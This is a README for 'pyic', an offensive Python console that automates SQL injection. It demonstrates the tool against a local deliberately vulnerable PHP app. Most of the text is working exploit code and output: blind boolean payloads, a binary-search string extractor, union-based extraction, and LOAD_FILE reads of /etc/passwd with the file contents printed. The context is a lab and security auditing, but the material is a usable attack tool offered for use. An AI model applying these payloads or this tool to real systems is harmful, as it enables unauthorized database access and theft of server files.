# pyic

[![Build Status](https://travis-ci.com/NeuronAddict/pyic.svg?branch=master)](https://travis-ci.com/NeuronAddict/pyic)

Python injection console

pyic is a set of python libs, loaded by a console to make RCE and SQLi more reliable.

## the fact

When we write an sqli poc, we already have the same problem :
* base code is always different (use encoding, url specific logic, evasion, ...)
* attack is always the same, for example, blid injection can be complex to re write every time.

To address this problem, this project load a python console, that allow you to write a on a little part of our code (the only needed) and provide tools to perform attacks with your code base.

## Let's begin

Because example is more simple.

### 1. get the vulnerable app
```
$ git clone https://github.com/NeuronAddict/vulnerable-webapps.git
$ cd vulnerable-webapps/sqli
$ nano docker-compose.yml # edit your port, bind ip, etc. DON'T EXPOSE THE APP ON PUBLIC NETWORK
$ docker-compose up
 ...
```
Here, our vulnerable app is lisening on 127.0.0.1:8181.
This apps expose some simple vulnerabilities, the php code is very simple.

### 2. use pyic

First, we launch the console and create a request builder.
```
$ pip3 install termcolor html2text # may be you need some python requirements
$ cd ~/pyic
$ ./pyic.sh 
Python 3.6.8 (default, Jan  3 2019, 03:42:36) 
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
#########################
#
# pyic lib loaded!
#
#########################

To get help, type help(object) with object the following : Tester, BlindStringFinder, UnionStringFinder, BlindTester, SqliEncoder, DbDumper, HasText, Not, loop, StarExtract

Type dir() to see all availables types and try help(<type>) to search other help

You can also read the source code!

https://github.com/NeuronAddict/pyic

>>> rb = lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 AND {}'.format(payload), 'log': '1'})
```

Now, we will create a loop, that will send our payload and show the result.

```
>>> loop(rb)

[*] You are entering on payload mode, enter a payload to quick send it via your request builder.

payload : >>> 1=1
[*] (request) http://127.0.0.1:8181/comment.php?id=1+AND+1%3D1&log=1
    (headers) {'User-Agent': 'python-requests/2.20.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
    (body) None
[*] (response) 200
    (headers) {'Date': 'Tue, 19 Feb 2019 15:04:58 GMT', 'Server': 'Apache/2.4.25 (Debian)', 'X-Powered-By': 'PHP/7.3.2', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '259', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
    (text body)
 <h2>filtered injection</h2>

<p>special chars ('";#-) are filtereds, can you inject me?</p>
<p>note : to see log, set a cookie, get or post log=1</p>

<a href="/comment.php?id=1">/comment.php?id=1</a>

<p>[*] filter id : "1 AND 1=1" ==> "1 AND 1=1"</p>
<p>[*] "SELECT id, name, text FROM comments WHERE id=1 AND 1=1"</p>
<br /><br /><p>comment 1</p><h2>admin</h2><p>Hi!</p>


payload : >>> 1=0
[*] (request) http://127.0.0.1:8181/comment.php?id=1+AND+1%3D0&log=1
    (headers) {'User-Agent': 'python-requests/2.20.0', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
    (body) None
[*] (response) 200
    (headers) {'Date': 'Tue, 19 Feb 2019 15:05:15 GMT', 'Server': 'Apache/2.4.25 (Debian)', 'X-Powered-By': 'PHP/7.3.2', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '254', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
    (text body)
 <h2>filtered injection</h2>

<p>special chars ('";#-) are filtereds, can you inject me?</p>
<p>note : to see log, set a cookie, get or post log=1</p>

<a href="/comment.php?id=1">/comment.php?id=1</a>

<p>[*] filter id : "1 AND 1=0" ==> "1 AND 1=0"</p>
<p>[*] "SELECT id, name, text FROM comments WHERE id=1 AND 1=0"</p>
<br /><br /><p>[-] No results</p>
```

What have we do? we have quickly tested that the response is different when assertion is true or false.
During an audit, we can also quickly send the code that generate the rb to our team.

### 3 Exploit 

Ok, now what can we do with this injection? Lets exploit this vuln.

```
payload : >>> exit

>>> tester = BlindTester(rb, lambda r: 'admin' in r.text)
>>> sf = BlindStringFinder(tester)
>>> print(sf.read_string("(SELECT version())"))
[===================>] 100%
5.7.11-log
>>> 
```

We have created : 
* A tester, that use our request builder and get a criteria that say if the assertion is true or false. Here it is a lambda, but it can be every callable (a fundtion ou a callable object).
* A BlindStringFinder, that use our tester to get the value of a string by blind injection. It use a binary search algorithm to make the process more speed.

And now, we can give every string to our BlindStringFinder and quickly get values from the database.

### 4 read file

Now, we want see is file can be reads. to make this, we can read the string LOAD_FILE('/etc/passwd').

But there is a problem : what if when our vulnerable app give us an item, they wait 3s?
Ok, now lets imagine the time to read a simple file chars by chars. My /etc/passwd has ~3000 chars, the time will become about 3000 * (log2(255)/2) * 3.
Its very long, and you will wait a very long time to get your file.

But with pyic, we can optimise the process :
* first pyic evaluate the file size (with binary search algorithm)
* next, he run all the searchs with massive parallelism, so the time is drastically reduced

And now, in less than a minute we can read our file : 

```
>>> print(sf.read_file('/etc/passwd'))
[===================>] 100%
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:999:999::/home/mysql:/bin/sh
```

The progress indicator give us an indication of the speed of the process.

Nice, we don't have to rewrite all this code every time!

### 5 Extract some value

Now, lets exploit another vulnerabily, we have an injection that display the output of the query on a field.

```
>>> rb = lambda payload : requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'})
>>> usf = UnionStringFinder('AND 1=0 UNION ALL SELECT 1,2,{}', rb, StarExtract('<h2>2</h2><p>*</p>'))
>>> print(usf.read_string('(SELECT version())'))
5.7.11-log
>>> print(usf.read_file('/etc/passwd'))
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
```

What have we do? 
* We create a request builder that add a payload after our index.
* We create a UnionStringFinder, that will extract exactly the info that we want.
* The StarExtract will get the first pattern that match his expression and display only the value on the '*'

The benefit is: 
* When we discover the vuln, 2 lines of code are suffisient to share the vuln with the team or publish them.
* We can add all logic that we want (evasion, encoding, ...) the only limit is the python language.
* We can use the output to build more complex exploit.

## More help

This is just an example, if you want more help, see the message displayed when the console launch :

```
To get help, type help(object) with object the following : Tester, BlindStringFinder, UnionStringFinder, BlindTester, SqliEncoder, DbDumper, HasText, Not, loop, StarExtract

Type dir() to see all availables types and try help(<type>) to search other help
```

Lets try  :

```
>>> dir()
['BlindStringFinder', 'BlindTester', 'DbDumper', 'HasText', 'ManualLoop', 'MssqlPayloads', 'MysqlPayloads', 'Not', 'SqliEncoder', 'StarExtract', 'UnionStringFinder', '__annotations__', '__builtins__', '__cached__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'colored', 'loop', 'rb', 'requests', 'sf', 'tester', 'usf']
>>> help(SqliEncoder)
```

This project is very young, so this doc is very small.

## support

This tool is very young, more doc is comming, if you want more doc or experiment a bug, you can post an issue : https://github.com/NeuronAddict/pyic/issues.

## TODO

- move doc on the wiki
- chaining extractors
- improve logging (see branch)














